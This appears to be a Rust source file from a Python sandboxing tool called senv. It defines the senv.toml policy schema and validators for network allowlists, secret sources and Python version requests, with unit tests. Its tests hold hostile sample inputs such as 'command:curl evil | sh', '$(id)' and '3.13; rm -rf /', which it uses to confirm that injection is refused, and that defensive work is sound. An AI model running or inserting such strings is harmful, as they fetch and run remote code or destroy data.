//! `senv.toml` — the project's policy source.
//!
//! Users write Python-project vocabulary here; [`crate::policy`] compiles it
//! into h5i `Profile`s. The schema is deliberately small and
//! `deny_unknown_fields` throughout: a misspelled key in a security policy must
//! be an error, never a silently-ignored line that reads as though it were
//! enforced.
//!
//! Every field is optional. A project with no `senv.toml` at all gets the
//! fail-closed defaults, which is the point — adoption should cost nothing, and
//! the file appears only when the user first widens something.

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::error::{Result, SenvError, fs};

/// What a phase may reach on the network.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(untagged)]
pub enum NetSpec {
    /// `"deny"` or `"host"`.
    Mode(NetWord),
    /// An explicit domain allowlist, e.g. `["api.example.com", ".s3.amazonaws.com"]`.
    Hosts(Vec<String>),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum NetWord {
    /// No network at all. The default for the run phase.
    Deny,
    /// Unrestricted network. Always announced in `senv status` and receipts.
    Host,
}

impl NetSpec {
    pub fn deny() -> Self {
        NetSpec::Mode(NetWord::Deny)
    }

    pub fn hosts(&self) -> &[String] {
        match self {
            NetSpec::Hosts(h) => h,
            NetSpec::Mode(_) => &[],
        }
    }

    pub fn is_host(&self) -> bool {
        matches!(self, NetSpec::Mode(NetWord::Host))
    }

    pub fn is_deny(&self) -> bool {
        matches!(self, NetSpec::Mode(NetWord::Deny))
    }

    /// How this reads in `senv status`.
    pub fn describe(&self) -> String {
        match self {
            NetSpec::Mode(NetWord::Deny) => "deny (no network)".to_string(),
            NetSpec::Mode(NetWord::Host) => "host (UNRESTRICTED)".to_string(),
            NetSpec::Hosts(h) if h.is_empty() => "deny (empty allowlist)".to_string(),
            NetSpec::Hosts(h) => format!("allowlist: {}", h.join(", ")),
        }
    }
}

/// Where the wheel cache lives.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum CacheScope {
    /// One cache per project, under senv's state directory. The default: a
    /// package that poisons a cache during install can only poison the project
    /// that installed it.
    #[default]
    Project,
    /// One cache shared by every senv project on this machine. Faster and
    /// smaller on disk; a compromised install in one project reaches the
    /// others.
    Shared,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct Config {
    pub env: EnvSection,
    pub install: InstallSection,
    pub run: RunSection,
    /// Secret grants, by the environment-variable name the child receives.
    pub secrets: BTreeMap<String, SecretSection>,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct EnvSection {
    /// Python version for `uv` to use, e.g. `"3.13"`.
    pub python: Option<String>,
    /// `auto` (default) or an explicit h5i tier: `process`, `supervised`,
    /// `container`, `microvm`. `workspace` is rejected — senv has no
    /// unconfined execution path.
    pub isolation: Option<String>,
    /// Base OCI image, required by the `container` and `microvm` tiers.
    pub image: Option<String>,
    /// Absolute path to the `uv` binary, when it is not on `PATH`.
    pub uv: Option<String>,
    /// Permit secret sources that run host code **outside the sandbox**
    /// (`source = "command:…"`).
    ///
    /// Off by default, and separate from the secret declaration itself,
    /// because it is the single most dangerous line this file can contain: the
    /// command runs unconfined, with your full environment. h5i gates it for
    /// the same reason; senv used to enable it implicitly whenever a
    /// `command:` source appeared, which turned a deliberate escape hatch into
    /// an automatic one. Turning it on is a widening change, so a package that
    /// edits this file cannot turn it on quietly.
    pub allow_command_secrets: bool,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct InstallSection {
    /// Package registries beyond PyPI, e.g. `["download.pytorch.org"]`.
    pub extra_indexes: Vec<String>,
    /// `"registries"` (default) restricts egress to the package indexes.
    /// `"host"` is the explicit, warned downgrade for hosts that cannot
    /// enforce a domain allowlist.
    pub net: InstallNet,
    pub cache: CacheScope,
    /// Extra read-only paths the install phase may see — for a local path
    /// dependency outside the project tree.
    pub read: Vec<String>,
    /// Let the install phase write to the project directory.
    ///
    /// Off by default: `senv sync` gives the project to uv **read-only**, so a
    /// dependency's build backend cannot modify your source while installing.
    /// Some backends (older setuptools layouts in particular) insist on writing
    /// metadata into the source tree and fail without this. senv detects that
    /// failure and names this key rather than guessing.
    pub project_writable: bool,
    pub resources: ResourceSection,
}

impl Default for InstallSection {
    fn default() -> Self {
        InstallSection {
            extra_indexes: Vec::new(),
            net: InstallNet::Registries,
            cache: CacheScope::default(),
            read: Vec::new(),
            project_writable: false,
            resources: ResourceSection::default(),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum InstallNet {
    /// Egress limited to the package indexes. Needs a tier that enforces a
    /// domain allowlist.
    #[default]
    Registries,
    /// Unrestricted egress during installs. Never selected automatically.
    Host,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct RunSection {
    pub net: NetSpec,
    pub fs: FsSection,
    pub env: RunEnvSection,
    pub resources: ResourceSection,
}

impl Default for RunSection {
    fn default() -> Self {
        RunSection {
            net: NetSpec::deny(),
            fs: FsSection::default(),
            env: RunEnvSection::default(),
            resources: ResourceSection::default(),
        }
    }
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct FsSection {
    /// Extra read-only grants, beyond the project and the environment.
    pub read: Vec<String>,
    /// Extra writable grants, beyond the project and senv's scratch directory.
    pub write: Vec<String>,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct RunEnvSection {
    /// Host environment variables forwarded to the command. senv's baseline
    /// (`PATH`, `HOME`, `LANG`, `TERM`, `COLORTERM`) is always included.
    pub pass: Vec<String>,
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct ResourceSection {
    /// e.g. `"4G"`.
    pub mem: Option<String>,
    /// e.g. `"30m"`, or `"none"` for a long-running process (see
    /// [`ResourceSection::wall_is_unbounded`]).
    pub wall: Option<String>,
    pub procs: Option<u64>,
    /// Max single file size, e.g. `"1G"`.
    pub fsize: Option<String>,
    /// CPU-time backstop, e.g. `"10m"`.
    pub cpu: Option<String>,
}

impl ResourceSection {
    /// `wall = "none"` — the escape hatch for dev servers and watchers.
    ///
    /// h5i refuses an unbounded wall clock by construction (its default is 30
    /// minutes and a profile cannot express "forever"), and that default is
    /// right for a task and wrong for `senv run uvicorn`. senv resolves this
    /// without weakening the engine: `none` is expressed to h5i as a very long
    /// but finite wall, so the kill switch still exists and still appears in
    /// the digest.
    pub fn wall_is_unbounded(&self) -> bool {
        self.wall.as_deref().map(|w| w.eq_ignore_ascii_case("none")) == Some(true)
    }
}

#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields, rename_all = "kebab-case", default)]
pub struct SecretSection {
    /// `env:VAR`, `file:/abs/path`, or `command:<shell>`.
    pub source: Option<String>,
    /// `env` (default) or `file`.
    pub inject: Option<String>,
    pub ttl: Option<String>,
    /// Phases this secret reaches. Only `run` and `shell` are accepted: a
    /// credential must never be visible to a dependency's build backend.
    pub phases: Vec<String>,
}

/// The file name senv looks for.
pub const CONFIG_FILE: &str = "senv.toml";

impl Config {
    /// Load `senv.toml`, or the fail-closed defaults when it is absent.
    pub fn load(path: &Path) -> Result<Config> {
        if !path.is_file() {
            return Ok(Config::default());
        }
        let text = fs::read_to_string(path)?;
        let cfg: Config = toml::from_str(&text).map_err(|e| {
            // toml's message already carries the line/column and a caret; the
            // path prefix from SenvError::Config completes it. Sanitized
            // because the message quotes the offending line, and this file is
            // writable by code running under senv.
            SenvError::config(path, crate::util::sanitize_multiline(&e.to_string()))
        })?;
        cfg.validate(path)?;
        Ok(cfg)
    }

    /// Reject configurations that are invalid on their face, before any policy
    /// is compiled — so the error names the file and the key rather than
    /// surfacing later as an opaque engine refusal.
    pub fn validate(&self, path: &Path) -> Result<()> {
        if let Some(iso) = &self.env.isolation {
            let iso = iso.trim();
            if !iso.eq_ignore_ascii_case("auto") {
                let claim = h5i_sandbox::sandbox_policy::IsolationClaim::parse(iso)
                    .map_err(|e| SenvError::config(path, format!("[env] isolation: {e}")))?;
                if claim == h5i_sandbox::sandbox_policy::IsolationClaim::Workspace {
                    return Err(SenvError::config(
                        path,
                        "[env] isolation = \"workspace\" applies no confinement at all. \
                         senv has no unconfined execution path — use \"process\" or stronger, \
                         or plain uv if you do not want a boundary.",
                    ));
                }
            }
        }

        if let Some(python) = &self.env.python {
            validate_python_request(python)
                .map_err(|e| SenvError::config(path, format!("[env] python: {e}")))?;
        }

        for (name, s) in self.secrets.iter() {
            let source = s.source.clone().unwrap_or_default();
            if source.starts_with("command:") && !self.env.allow_command_secrets {
                return Err(SenvError::config(
                    path,
                    format!(
                        "[secrets.{name}] uses a command: source, which runs on the host \
                         OUTSIDE the sandbox with your full environment. Set [env] \
                         allow-command-secrets = true to permit that, or use env:/file: \
                         instead (fail-closed)."
                    ),
                ));
            }
        }

        for (name, _) in self.secrets.iter() {
            if name.is_empty() || !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
                return Err(SenvError::config(
                    path,
                    format!(
                        "[secrets.{name}] is not a usable name — it becomes an environment \
                         variable, so use ASCII letters, digits and '_'"
                    ),
                ));
            }
        }
        for (name, s) in self.secrets.iter() {
            for phase in &s.phases {
                if !matches!(phase.as_str(), "run" | "shell") {
                    return Err(SenvError::config(
                        path,
                        format!(
                            "[secrets.{name}] phases = [\"{phase}\"] is not allowed. A secret \
                             may reach \"run\" and \"shell\" only — never the install phase, \
                             where a dependency's build backend would see it."
                        ),
                    ));
                }
            }
        }

        for (label, r) in [
            ("run.resources", &self.run.resources),
            ("install.resources", &self.install.resources),
        ] {
            if let Some(mem) = &r.mem {
                h5i_sandbox::sandbox::parse_mem(mem)
                    .map_err(|e| SenvError::config(path, format!("[{label}] mem: {e}")))?;
            }
            if let Some(fsize) = &r.fsize {
                h5i_sandbox::sandbox::parse_mem(fsize)
                    .map_err(|e| SenvError::config(path, format!("[{label}] fsize: {e}")))?;
            }
            if let Some(cpu) = &r.cpu {
                h5i_sandbox::sandbox::parse_wall(cpu)
                    .map_err(|e| SenvError::config(path, format!("[{label}] cpu: {e}")))?;
            }
            if let Some(wall) = &r.wall
                && !r.wall_is_unbounded()
            {
                h5i_sandbox::sandbox::parse_wall(wall)
                    .map_err(|e| SenvError::config(path, format!("[{label}] wall: {e}")))?;
            }
        }

        for host in self
            .run
            .net
            .hosts()
            .iter()
            .chain(self.install.extra_indexes.iter())
        {
            validate_host_pattern(host).map_err(|e| SenvError::config(path, e))?;
        }

        Ok(())
    }
}

/// Check an egress entry the way h5i's proxy will parse it, so a bad pattern is
/// refused where the user can see it rather than at run time.
///
/// Accepts `host`, `.suffix.example`, `*.suffix.example`, and any of those with
/// `:port`. Refuses single-label wildcards (`.com`), which would allowlist a
/// whole TLD.
pub fn validate_host_pattern(entry: &str) -> std::result::Result<(), String> {
    let entry = entry.trim();
    if entry.is_empty() {
        return Err("an empty host entry allowlists nothing and reads as though it did".into());
    }
    let (host, port) = match entry.rsplit_once(':') {
        Some((h, p)) => (h, Some(p)),
        None => (entry, None),
    };
    if let Some(p) = port
        && p.parse::<u16>().is_err()
    {
        return Err(format!("'{entry}': '{p}' is not a port number"));
    }
    let bare = host.trim_start_matches("*.").trim_start_matches('.');
    if bare.is_empty() {
        return Err(format!("'{entry}' names no host"));
    }
    let wildcarded = host.starts_with('.') || host.starts_with("*.");
    if wildcarded && !bare.contains('.') {
        return Err(format!(
            "'{entry}' would allowlist an entire top-level domain — use a wildcard with at \
             least two labels, e.g. '*.{bare}.example'"
        ));
    }
    if !bare
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_')
    {
        return Err(format!("'{entry}' is not a hostname"));
    }
    Ok(())
}

/// Check a requested Python version before it becomes a `uv` argument.
///
/// `.python-version` and `[env] python` are both attacker-writable (the run
/// phase grants the project read-write), and the value is passed to
/// `uv python install`. Without this, `--mirror https://evil` in that file
/// becomes a uv flag and senv fetches an interpreter from wherever the
/// attacker says. Anything that is not a version-shaped token is refused.
pub fn validate_python_request(value: &str) -> std::result::Result<(), String> {
    let value = value.trim();
    if value.is_empty() {
        return Err("is empty".to_string());
    }
    if value.len() > 64 {
        return Err("is implausibly long for a version".to_string());
    }
    // Must start with a digit, so it can never be read as a flag. uv also
    // accepts implementation-qualified requests like `cpython@3.13`, hence the
    // permitted separators — none of which can begin the string.
    if !value.starts_with(|c: char| c.is_ascii_digit()) {
        return Err(format!(
            "'{}' is not a version number. senv only accepts requests beginning with a digit \
             (e.g. 3.13, 3.13.2), because this value becomes an argument to uv and a leading \
             '-' would be read as a flag.",
            crate::util::sanitize(value)
        ));
    }
    if !value
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'+')
    {
        return Err(format!(
            "'{}' contains characters a version does not",
            crate::util::sanitize(value)
        ));
    }
    Ok(())
}

/// Where `senv.toml` lives for a project root.
pub fn config_path(root: &Path) -> PathBuf {
    root.join(CONFIG_FILE)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn parse(text: &str) -> Result<Config> {
        let cfg: Config = toml::from_str(text)
            .map_err(|e| SenvError::config(PathBuf::from("senv.toml"), e.to_string()))?;
        cfg.validate(Path::new("senv.toml"))?;
        Ok(cfg)
    }

    #[test]
    fn an_absent_config_is_the_fail_closed_default() {
        let cfg = Config::load(Path::new("/nonexistent/senv.toml")).expect("defaults");
        assert!(
            cfg.run.net.is_deny(),
            "the run phase must default to no network"
        );
        assert_eq!(cfg.install.net, InstallNet::Registries);
        assert_eq!(cfg.install.cache, CacheScope::Project);
        assert!(cfg.secrets.is_empty());
    }

    #[test]
    fn a_misspelled_key_is_an_error_not_a_silently_ignored_line() {
        // The failure this guards: `nett = "host"` parsing fine, the user
        // believing the network is open, and the policy saying otherwise — or
        // worse, the reverse.
        let err = parse("[run]\nnett = \"host\"\n").expect_err("must refuse");
        assert!(err.to_string().contains("nett"), "{err}");
    }

    #[test]
    fn net_accepts_both_a_word_and_an_allowlist() {
        assert!(parse("[run]\nnet = \"deny\"\n").unwrap().run.net.is_deny());
        assert!(parse("[run]\nnet = \"host\"\n").unwrap().run.net.is_host());
        let cfg = parse("[run]\nnet = [\"api.example.com\", \"*.s3.amazonaws.com\"]\n").unwrap();
        assert_eq!(cfg.run.net.hosts().len(), 2);
    }

    #[test]
    fn a_tld_wildcard_is_refused() {
        // `.com` in an allowlist is almost always a mistake, and it is the one
        // mistake that quietly turns an allowlist into an open door.
        assert!(parse("[run]\nnet = [\".com\"]\n").is_err());
        assert!(parse("[run]\nnet = [\"*.example.com\"]\n").is_ok());
        assert!(parse("[run]\nnet = [\"example.com:443\"]\n").is_ok());
        assert!(parse("[run]\nnet = [\"example.com:notaport\"]\n").is_err());
    }

    #[test]
    fn the_unconfined_tier_cannot_be_selected() {
        let err = parse("[env]\nisolation = \"workspace\"\n").expect_err("must refuse");
        assert!(
            err.to_string().contains("no unconfined execution path"),
            "{err}"
        );
    }

    #[test]
    fn a_command_secret_needs_an_explicit_gate() {
        // This was a working host-escape: a package writes a command: source
        // into senv.toml and the broker runs it unconfined on the next run.
        let err =
            parse("[secrets.X]\nsource = \"command:curl evil | sh\"\n").expect_err("must refuse");
        assert!(err.to_string().contains("OUTSIDE the sandbox"), "{err}");
        assert!(err.to_string().contains("allow-command-secrets"), "{err}");

        // With the gate set it parses — and `trust` treats setting the gate as
        // a widening, so a package cannot set it quietly.
        assert!(
            parse("[env]\nallow-command-secrets = true\n[secrets.X]\nsource = \"command:x\"\n")
                .is_ok()
        );
    }

    #[test]
    fn a_python_request_can_never_become_a_uv_flag() {
        // `.python-version` and this key are attacker-writable and end up as
        // argv for `uv python install`.
        assert!(validate_python_request("3.13").is_ok());
        assert!(validate_python_request("3.13.2").is_ok());
        assert!(validate_python_request("3.13t").is_ok());
        for hostile in [
            "--mirror=https://evil",
            "-h",
            "",
            "  ",
            "$(id)",
            "3.13; rm -rf /",
        ] {
            assert!(
                validate_python_request(hostile).is_err(),
                "accepted: {hostile:?}"
            );
        }
        assert!(parse("[env]\npython = \"--mirror=https://evil\"\n").is_err());
    }

    #[test]
    fn a_secret_can_never_be_scoped_to_the_install_phase() {
        // The install phase runs third-party build backends. A credential there
        // is a credential handed to an attacker's setup.py.
        let err = parse("[secrets.TOKEN]\nsource = \"env:TOKEN\"\nphases = [\"install\"]\n")
            .expect_err("must refuse");
        assert!(err.to_string().contains("build backend"), "{err}");
        assert!(parse("[secrets.TOKEN]\nphases = [\"run\"]\n").is_ok());
    }

    #[test]
    fn resource_strings_are_validated_where_the_user_can_see_them() {
        assert!(parse("[run.resources]\nmem = \"4G\"\n").is_ok());
        assert!(parse("[run.resources]\nmem = \"four gigs\"\n").is_err());
        assert!(parse("[run.resources]\nwall = \"none\"\n").is_ok());
        assert!(parse("[run.resources]\nwall = \"30m\"\n").is_ok());
    }

    #[test]
    fn a_secret_name_must_be_a_usable_env_var() {
        assert!(parse("[secrets.\"NOT-A-VAR\"]\nsource = \"env:X\"\n").is_err());
        assert!(parse("[secrets.OPENAI_API_KEY]\nsource = \"env:OPENAI_API_KEY\"\n").is_ok());
    }
}
